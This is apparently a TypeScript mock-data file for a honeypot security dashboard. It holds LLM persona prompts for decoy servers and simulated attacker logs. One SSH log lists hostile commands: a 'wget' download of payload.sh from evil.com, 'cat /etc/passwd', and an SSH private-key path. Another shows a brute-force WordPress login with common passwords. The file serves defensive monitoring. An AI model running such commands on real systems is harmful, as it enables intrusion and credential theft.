import { InteractionLog, Alert, Activity, Attack, AlertSeverity, Metric, ActiveHoneypot, AlertStatus, AuditLogEntry, UserRole, ThreatEvent } from '../types';

// Centralized list of active honeypots
const BASE_ACTIVE_HONEYPOTS: Omit<ActiveHoneypot, 'interactions'>[] = [
    { id: 'HP001', name: 'Prod Web Server 01', type: 'Vulnerable Web Server', status: 'online', ipAddress: '172.18.0.5', createdAt: '2 days ago', systemInstruction: 'You are a vulnerable WordPress server running version 5.8. Your hostname is "web-prod-01". You should respond realistically to web scans and login attempts. Provide fake error messages that seem plausible but do not reveal real system information. If a user tries to access wp-login.php, present a fake login prompt.' },
    { id: 'HP002', name: 'Dev SSH Server', type: 'Unsecured SSH Port', status: 'online', ipAddress: '172.18.0.6', createdAt: '5 days ago', systemInstruction: "You are a slightly misconfigured Linux server running Ubuntu 22.04. Your hostname is 'ubuntu-dev-srv'. Respond realistically to common Linux commands like ls, pwd, whoami. Be slightly helpful but not too perfect. Some commands might fail or produce odd results. You have a few fake user directories in /home like 'jdoe' and 'admin'." },
    { id: 'HP003', name: 'Mongo DB (Public)', type: 'Exposed Database', status: 'warning', ipAddress: '172.18.0.7', createdAt: '1 day ago', systemInstruction: "You are an exposed MongoDB database, version 4.4, without proper authentication. You contain several fake collections like 'users', 'products', and 'session_logs'. When queried, provide realistic but entirely fabricated document structures. The data should look like it belongs to a small e-commerce company." },
    { id: 'HP004', name: 'Public AWS S3', type: 'Public AWS S3 Bucket', status: 'online', ipAddress: '172.18.0.8', createdAt: '1 week ago', systemInstruction: "You are a publicly accessible AWS S3 bucket named 'company-public-assets'. You contain a mix of seemingly public files (images, css) and some files that should be private, like '2023_financials.pdf', 'employee_data.csv', and 'db_backups/'. Listing the bucket contents should be possible, but attempting to access the sensitive files should generate a plausible but fake access denied error." },
];

const COUNTRY_COORDINATES: Record<string, { lat: number; lng: number }> = {
    IR: { lat: 32.42, lng: 53.68 },
    CN: { lat: 39.9, lng: 116.4 },
    RU: { lat: 55.75, lng: 37.61 },
    US: { lat: 38.89, lng: -77.03 },
    BR: { lat: -14.23, lng: -51.92 },
    SIM: { lat: 45.4215, lng: -75.6972 }, // Ottawa, for simulated attacks
};

// --- SINGLE SOURCE OF TRUTH ---
export const MASTER_INTERACTION_LOGS: InteractionLog[] = [
    {
        id: 'INT001',
        honeypotName: 'Dev SSH Server',
        honeypotType: 'Unsecured SSH Port',
        attackerIp: '198.51.100.210',
        countryCode: 'IR',
        location: COUNTRY_COORDINATES['IR'],
        interactionType: 'SSH Session',
        severity: AlertSeverity.Critical,
        timestamp: new Date(Date.now() - 2 * 60 * 60 * 1000).toISOString(),
        duration: 320,
        isEmergingThreat: true,
        ttps: [
            { tactic: 'TA0007: Discovery', technique: 'T1082: System Information Discovery', description: "Used 'uname -a' and 'lscpu' to gather system details." },
            { tactic: 'TA0007: Discovery', technique: 'T1083: File and Directory Discovery', description: "Used 'ls -la /home' to find user directories." },
            { tactic: 'TA0011: Command and Control', technique: 'T1105: Ingress Tool Transfer', description: "Attempted to download an external tool using 'wget'." },
        ],
        extractedIntelligence: {
            usernames: ['root', 'admin', 'jdoe'],
            passwords: ['password', '123456', 'admin'],
            commands: ['ls -la', 'whoami', 'uname -a', 'cat /etc/passwd', 'wget http://evil.com/payload.sh'],
            files: ['/etc/passwd', '/home/jdoe/.ssh/id_rsa', 'config.txt'],
        },
        steps: [
            { type: 'input', content: 'whoami', timestamp: new Date(Date.now() - 2 * 60 * 60 * 1000 - 315000).toISOString() },
            { type: 'output', content: 'root', timestamp: new Date(Date.now() - 2 * 60 * 60 * 1000 - 314000).toISOString() },
            { type: 'input', content: 'wget http://evil.com/payload.sh', timestamp: new Date(Date.now() - 2 * 60 * 60 * 1000 - 120000).toISOString() },
            { type: 'output', content: 'wget: command not found', timestamp: new Date(Date.now() - 2 * 60 * 60 * 1000 - 119000).toISOString() },
        ],
    },
    {
        id: 'INT002',
        honeypotName: 'Prod Web Server 01',
        honeypotType: 'Vulnerable Web Server',
        attackerIp: '203.0.113.45',
        countryCode: 'CN',
        location: COUNTRY_COORDINATES['CN'],
        interactionType: 'Web Login Attempt',
        severity: AlertSeverity.High,
        timestamp: new Date(Date.now() - 5 * 60 * 60 * 1000).toISOString(),
        duration: 12,
        isEmergingThreat: true,
        ttps: [
            { tactic: 'TA0006: Credential Access', technique: 'T1110: Brute Force', description: 'Repeatedly attempted to log in using a list of common credentials.' },
        ],
        extractedIntelligence: {
            usernames: ['admin', 'editor', 'testuser'],
            passwords: ['admin', 'password123', '123456'],
            commands: [],
            files: ['wp-login.php'],
        },
        steps: [
            { type: 'input', content: 'POST /wp-login.php user=admin&pass=admin', timestamp: new Date(Date.now() - 5 * 60 * 60 * 1000 - 10000).toISOString() },
            { type: 'output', content: 'HTTP/1.1 200 OK - Invalid username or password.', timestamp: new Date(Date.now() - 5 * 60 * 60 * 1000 - 9000).toISOString() },
        ]
    },
    {
        id: 'INT003',
        honeypotName: 'Mongo DB (Public)',
        honeypotType: 'Exposed Database',
        attackerIp: '192.0.2.88',
        countryCode: 'US',
        location: COUNTRY_COORDINATES['US'],
        interactionType: 'Database Query',
        severity: AlertSeverity.Medium,
        timestamp: new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString(),
        duration: 5,
        ttps: [],
        extractedIntelligence: { usernames: [], passwords: [], commands: ["db.users.find({})"], files: [] },
        steps: []
    },
     {
        id: 'INT004',
        honeypotName: 'Public AWS S3',
        honeypotType: 'Public AWS S3 Bucket',
        attackerIp: '203.0.113.101',
        countryCode: 'BR',
        location: COUNTRY_COORDINATES['BR'],
        interactionType: 'S3 Bucket Scan',
        severity: AlertSeverity.Low,
        timestamp: new Date(Date.now() - 2 * 24 * 60 * 60 * 1000).toISOString(),
        duration: 180,
        isEmergingThreat: true,
        ttps: [
            { tactic: 'TA0007: Discovery', technique: 'T1580: Cloud Infrastructure Discovery', description: "Scanned for open S3 buckets and listed contents." }
        ],
        extractedIntelligence: { usernames: [], passwords: [], commands: ["aws s3 ls s3://company-public-assets"], files: [] },
        steps: []
    },
    {
        id: 'INT005',
        honeypotName: 'Prod Web Server 01',
        honeypotType: 'Vulnerable Web Server',
        attackerIp: '198.51.100.210', // Same attacker as INT001
        countryCode: 'IR',
        location: COUNTRY_COORDINATES['IR'],
        interactionType: 'Web Login Attempt',
        severity: AlertSeverity.High,
        timestamp: new Date(Date.now() - 6 * 60 * 60 * 1000).toISOString(),
        duration: 8,
        ttps: [{ tactic: 'TA0006: Credential Access', technique: 'T1110: Brute Force', description: 'Attempted to log in using a list of common credentials.' }],
        extractedIntelligence: { usernames: ['root', 'webmaster'], passwords: ['toor', 'password'], commands: [], files: [] },
        steps: []
    },
    {
        id: 'INT006',
        honeypotName: 'Dev SSH Server',
        honeypotType: 'Unsecured SSH Port',
        attackerIp: '198.51.100.12',
        countryCode: 'RU',
        location: COUNTRY_COORDINATES['RU'],
        interactionType: 'SSH Session',
        severity: AlertSeverity.High,
        timestamp: new Date(Date.now() - 3 * 24 * 60 * 60 * 1000).toISOString(),
        duration: 45,
        ttps: [],
        extractedIntelligence: { usernames: ['guest'], passwords: ['guest'], commands: ['ls', 'pwd'], files: [] },
        steps: [],
    }
];

// Function to generate all derived data from a master log
export const generateDerivedData = (interactions: InteractionLog[]) => {
    // Calculate interaction counts per honeypot
    const interactionCounts = interactions.reduce((acc, log) => {
        acc[log.honeypotName] = (acc[log.honeypotName] || 0) + 1;
        return acc;
    }, {} as Record<string, number>);

    // Create active honeypots with correct counts
    const activeHoneypots: ActiveHoneypot[] = BASE_ACTIVE_HONEYPOTS.map(honeypot => ({
        ...honeypot,
        interactions: interactionCounts[honeypot.name] || 0,
    }));

    // Derive Alerts from ALL interactions
    const alerts: Alert[] = interactions.map(log => {
        const statusMap: Record<string, AlertStatus> = {
            'INT001': AlertStatus.New,
            'INT002': AlertStatus.InProgress,
            'INT003': AlertStatus.Resolved,
            'INT004': AlertStatus.Resolved,
            'INT005': AlertStatus.InProgress,
            'INT006': AlertStatus.New,
        };
        return {
            id: `ALERT-${log.id}`,
            title: log.interactionType,
            severity: log.severity,
            status: statusMap[log.id] || AlertStatus.New,
            honeypotName: log.honeypotName,
            attackerIp: log.attackerIp,
            timestamp: log.timestamp,
            interactionId: log.id,
        };
    });

    // Derive Recent Activities (last 5 interactions)
    const activities: Activity[] = [...interactions]
        .sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime())
        .slice(0, 5)
        .map(log => ({
            id: log.id,
            type: log.interactionType,
            honeypot: log.honeypotName,
            attackerIp: log.attackerIp,
            severity: log.severity,
            timestamp: 'some time ago', // UI will format this
            countryCode: log.countryCode,
        }));

    // Derive Map Attacks
    const attacks: Attack[] = interactions.map(log => ({
        id: log.id,
        lat: log.location.lat,
        lng: log.location.lng,
        severity: log.severity,
    }));
    
    // Derive Dashboard Metrics
    const highSeverityCount = interactions.filter(i => i.severity === AlertSeverity.High || i.severity === AlertSeverity.Critical).length;
    const emergingThreatsCount = interactions.filter(i => i.isEmergingThreat).length;
    
    const metrics: Metric[] = [
        { label: 'Active Honeypots', value: activeHoneypots.length, change: '+1', changeType: 'increase' },
        { label: 'Total Interactions', value: interactions.length.toLocaleString(), change: '+15%', changeType: 'increase' },
        { label: 'High-Severity Alerts', value: highSeverityCount, change: '-1', changeType: 'decrease' },
        { label: 'Emerging Threats', value: emergingThreatsCount, change: '+1', changeType: 'increase' },
    ];


    return {
        interactions,
        alerts,
        activities,
        attacks,
        metrics,
        activeHoneypots
    };
};

export const generateAuditLog = (): AuditLogEntry[] => {
    return [
        { id: 'AUD001', user: 'admin', role: UserRole.Administrator, action: 'USER_LOGIN_SUCCESS', timestamp: new Date(Date.now() - 10 * 60 * 1000).toISOString(), details: 'Logged in from IP: 73.15.22.101' },
        { id: 'AUD002', user: 'admin', role: UserRole.Administrator, action: 'SETTINGS_NOTIFICATIONS_UPDATE', timestamp: new Date(Date.now() - 8 * 60 * 1000).toISOString(), details: 'Enabled SMS alerts' },
        { id: 'AUD003', user: 'engineer', role: UserRole.SecurityEngineer, action: 'USER_LOGIN_SUCCESS', timestamp: new Date(Date.now() - 7 * 60 * 1000).toISOString(), details: 'Logged in from IP: 192.168.1.5' },
        { id: 'AUD004', user: 'engineer', role: UserRole.SecurityEngineer, action: 'HONEYPOT_DEPLOY', timestamp: new Date(Date.now() - 5 * 60 * 1000).toISOString(), details: 'Deployed "Prod Web Server 01"' },
        { id: 'AUD005', user: 'analyst', role: UserRole.SecurityAnalyst, action: 'USER_LOGIN_SUCCESS', timestamp: new Date(Date.now() - 4 * 60 * 1000).toISOString(), details: 'Logged in from IP: 10.0.0.12' },
        { id: 'AUD006', user: 'analyst', role: UserRole.SecurityAnalyst, action: 'THREAT_HUNT_QUERY_RUN', timestamp: new Date(Date.now() - 3 * 60 * 1000).toISOString(), details: 'Query: "Show me all SSH sessions from Iran"' },
        { id: 'AUD007', user: 'admin', role: UserRole.Administrator, action: 'ALERT_STATUS_UPDATE', timestamp: new Date(Date.now() - 2 * 60 * 1000).toISOString(), details: 'Alert ALERT-INT002 status changed to "In Progress"' },
    ].sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
};

export const generateThreatFeed = (): ThreatEvent[] => {
    const { alerts, interactions } = generateDerivedData(MASTER_INTERACTION_LOGS);
    const feed: ThreatEvent[] = [];

    // 1. Add alerts
    alerts.forEach(alert => {
        feed.push({
            id: `feed-alert-${alert.id}`,
            type: 'alert',
            timestamp: alert.timestamp,
            severity: alert.severity,
            title: alert.title,
            summary: `Attacker IP: ${alert.attackerIp} on Honeypot: ${alert.honeypotName}.`,
            relatedId: alert.interactionId,
        });
    });

    // 2. Add emerging threats
    interactions.filter(i => i.isEmergingThreat).forEach(interaction => {
        feed.push({
            id: `feed-emerging-${interaction.id}`,
            type: 'emerging_threat',
            timestamp: interaction.timestamp,
            severity: interaction.severity,
            title: 'Emerging Threat Sighting',
            summary: `New or unusual activity pattern detected from ${interaction.attackerIp} (${interaction.countryCode}).`,
            relatedId: interaction.id,
        });
    });

    // 3. Add TTP sightings
    interactions.forEach(interaction => {
        if (interaction.ttps.length > 0) {
            const latestTtp = interaction.ttps[0];
            feed.push({
                id: `feed-ttp-${interaction.id}`,
                type: 'ttp_sighting',
                timestamp: new Date(new Date(interaction.timestamp).getTime() + 1000).toISOString(), // slightly offset to avoid identical timestamps
                severity: interaction.severity,
                title: 'TTP Detected',
                summary: `${latestTtp.technique} observed on ${interaction.honeypotName}.`,
                relatedId: interaction.id,
            });
        }
    });
    
    return feed.sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
};
